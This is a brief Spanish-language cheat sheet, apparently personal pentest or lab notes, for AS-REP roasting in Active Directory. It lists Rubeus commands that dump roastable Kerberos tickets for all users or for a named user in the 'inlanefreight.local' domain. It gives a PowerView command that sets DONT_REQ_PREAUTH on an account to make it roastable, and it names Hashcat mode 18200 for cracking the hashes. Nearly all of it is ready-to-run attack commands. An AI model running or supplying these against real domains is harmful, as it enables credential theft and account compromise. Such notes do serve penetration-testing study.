# Rubeus:

### Traer todos los tickets asreproasteables

    .\Rubeus.exe asreproast /nowrap
### Traer el ticket de un usuario en específico

    .\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt

### asignar el DONT_REQ_PREAUTH CON POWERVIEW

    Set-DomainObject -Identity <USER> -XOR @{useraccountcontrol=4194304} -Verbose
Hashcat 18200

